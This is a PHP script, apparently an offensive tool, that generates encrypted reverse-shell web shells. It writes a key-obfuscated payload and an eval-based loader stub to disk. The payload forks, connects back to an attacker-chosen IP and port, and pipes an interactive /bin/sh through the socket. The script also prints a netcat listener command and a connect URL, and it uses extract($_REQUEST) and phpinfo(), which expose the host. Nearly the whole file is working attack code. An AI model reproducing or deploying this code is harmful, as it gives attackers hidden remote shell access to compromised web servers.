<?php

/**************************************************************
 * php-reverse-shell
 * Generates an encrypted reverse shell implementation in PHP 
 * DISCLAIMER: I am not responsible for what you do with this information!
 * brad - slattman@gmail.com - 2006
 *************************************************************/

error_reporting(0);

extract($_REQUEST);

$do = $do ? $do : 'q';

switch ($do) {
	case 'q': { q(); break; }
	case 'info': { info(); break; }
	case 'gen': { gen($name, $key, $username, $password, $ip, $port); break; }
	default: { break; }
}

function q($msg='') {
	if ($msg) { echo $msg; } else {
		?>
		<html>
			<body>
				<form method=post>
					<h1>Generate a new shell</h1>
					<input type=hidden name=do value=gen />
					Shell Name: <input type=text name=name value="<?php echo substr(md5(rand(00000,999999)),0,5);?>" /><br />
					Shell Key: <input type=text name=key value="<?php echo substr(md5(rand(00000,999999)),0,5);?>" /><br />
					Shell Username: <input type=text name=username value="<?php echo substr(md5(rand(00000,999999)),0,5);?>" /><br />
					Shell Password: <input type=text name=password value="<?php echo substr(md5(rand(00000,999999)),0,5);?>" /><br />
					Shell Client IP: <input type=text name=ip value="<?php echo $_SERVER["REMOTE_ADDR"];?>" /><br />
					Shell Client Port: <input type=text name=port value="1081" /><br />
					<input type=submit name=submit value="Generate Shell" />
				</form>
				<br /><br /><br />
				<form method=post>
					<h1>Server Info</h1>
					<input type=hidden name=do value=info />
					<input type=submit name=submit value="Get Info" />
				</form>
			</body>
		</html>
		
		<?php
	}
}

function gen($name=false, $key=false, $username=false, $password=false, $ip=false, $port=false) {

	if (!$name) { $name = substr(md5(rand(00000,999999)),0,5); }
	if (!$key) { $key = substr(md5(rand(00000,999999)),0,5); }
	if (!$username) { $username = substr(md5(rand(00000,999999)),0,5); }
	if (!$password) { $password = substr(md5(rand(00000,999999)),0,5); }
	if (!$ip) { $ip = '0.0.0.0'; }
	if (!$port) { $port = '1081'; }

	$src = '$realm = \'Restricted area\';$users = array(\''.$username.'\' => \''.$password.'\');
	if (empty($_SERVER[\'PHP_AUTH_DIGEST\'])) {header(\'HTTP/1.1 401 Unauthorized\');header(\'WWW-Authenticate: Digest realm="\'.$realm.\'",qop="auth",nonce="\'.uniqid().\'",opaque="\'.md5($realm).\'"\');die(\'Well then, you should not have clicked cancel.\');}
	if (!($data = http_digest_parse($_SERVER[\'PHP_AUTH_DIGEST\'])) || !isset($users[$data[\'username\']])) die(\'Wrong Credentials!\');
	$A1 = md5($data[\'username\'] . \':\' . $realm . \':\' . $users[$data[\'username\']]);$A2 = md5($_SERVER[\'REQUEST_METHOD\'].\':\'.$data[\'uri\']);
	$valid_response = md5($A1.\':\'.$data[\'nonce\'].\':\'.$data[\'nc\'].\':\'.$data[\'cnonce\'].\':\'.$data[\'qop\'].\':\'.$A2);
	if ($data[\'response\'] != $valid_response) die(\'Wrong Credentials!\');echo \'Welcome  \' . $data[\'username\']."<br />\n";
	function http_digest_parse($txt) {$needed_parts = array(\'nonce\'=>1, \'nc\'=>1, \'cnonce\'=>1, \'qop\'=>1, \'username\'=>1, \'uri\'=>1, \'response\'=>1);$data = array();$keys = implode(\'|\', array_keys($needed_parts));preg_match_all(\'@(\' . $keys . \')=(?:([\\\'"])([^\2]+?)\2|([^\s,]+))@\', $txt, $matches, PREG_SET_ORDER);foreach ($matches as $m) {$data[$m[1]] = $m[3] ? $m[3] : $m[4];unset($needed_parts[$m[1]]);}return $needed_parts ? false : $data;}
	set_time_limit (0);$VERSION = "1.0";$ip = $_GET[\'ip\'];$port = $_GET[\'port\'];$chunk_size = 1400;$write_a = null;$error_a = null;$shell = \'uname -a; w; id; /bin/sh -i\';$daemon = 0;$debug = 0;
	if (function_exists(\'pcntl_fork\')) {$pid = pcntl_fork();if ($pid == -1) {printit("ERROR: Can\'t fork");exit(1);}if ($pid) {exit(0);}if (posix_setsid() == -1) {printit("Error: Can\'t setsid()");exit(1);}$daemon = 1;} else {}
	chdir("/");umask(0);$sock = fsockopen($ip, $port, $errno, $errstr, 30);if (!$sock) {printit("$errstr ($errno)");exit(1);}$descriptorspec = array(0 => array("pipe", "r"),1 => array("pipe", "w"),2 => array("pipe", "w"));
	$process = proc_open($shell, $descriptorspec, $pipes);if (!is_resource($process)) {printit("ERROR: Can\'t spawn shell");exit(1);}
	stream_set_blocking($pipes[0], 0);stream_set_blocking($pipes[1], 0);stream_set_blocking($pipes[2], 0);stream_set_blocking($sock, 0);printit("Successfully opened reverse shell to $ip:$port");
	while (1) {if (feof($sock)) {printit("ERROR: Shell connection terminated");break;}if (feof($pipes[1])) {printit("ERROR: Shell process terminated");break;}
	$read_a = array($sock, $pipes[1], $pipes[2]);$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);
	if (in_array($sock, $read_a)) {if ($debug) printit("SOCK READ");$input = fread($sock, $chunk_size);if ($debug) printit("SOCK: $input");fwrite($pipes[0], $input);}
	if (in_array($pipes[1], $read_a)) {if ($debug) printit("STDOUT READ");$input = fread($pipes[1], $chunk_size);if ($debug) printit("STDOUT: $input");fwrite($sock, $input);}
	if (in_array($pipes[2], $read_a)) {if ($debug) printit("STDERR READ");$input = fread($pipes[2], $chunk_size);if ($debug) printit("STDERR: $input");fwrite($sock, $input);}}
	fclose($sock);fclose($pipes[0]);fclose($pipes[1]);fclose($pipes[2]);proc_close($process);
	function printit ($string) {if (!$daemon) {print "$string\n";}}?>';

	$e = base64_encode($src);
	$e = gzdeflate($e);

	$d=0;
	$ea = str_split($e);
	$sa = str_split($key);
	foreach($sa as $k => $v) {
		$d += ord($v);
	}
	foreach($ea as $k => $v) {
		$ea[$k] = chr(ord($v) + $d);
	}
	$e = implode("", $ea);

	$h=fopen($name.".bin", "w");
	fwrite($h,$e);
	fclose($h);

	$code = 'error_reporting(0);if (isset($_REQUEST["key"])) {
	$e = file_get_contents("'.$name.'.bin");$d=0;
	$ea = str_split($e);$sa = str_split($_REQUEST["key"]);
	foreach($sa as $k => $v) {$d += ord($v);}
	foreach($ea as $k => $v) {$ea[$k] = chr(ord($v) - $d);}
	$e = implode("", $ea);eval(base64_decode(gzinflate($e)));}?>';

	$c = base64_encode($code);

	$code = '<?php $c="'.$c.'";eval(base64_decode($c));?>';

	$h=fopen($name.".php", "w");
	fwrite($h, $code);
	fclose($h);

	$msg = "<h2>Successfully generated new rshell!</h2><h4>rShell Name: $name</h4><h4>rShell Key: $key</h4><h4>rShell UserName: $username</h4><h4>rShell Password: $password</h4><h4>rShell Netcat Command: netcat -l -p $port -vvv</h4><h4>rShell Connect URL: <a target=_blank href='".$_SERVER["HTTP_REFERER"]."$name.php?key=$key&ip=$ip&port=$port'>".$_SERVER["HTTP_REFERER"]."$name.php?key=$key&ip=$ip&port=$port</a></h4>";

	q($msg);
}

function info() {phpinfo();}

?>
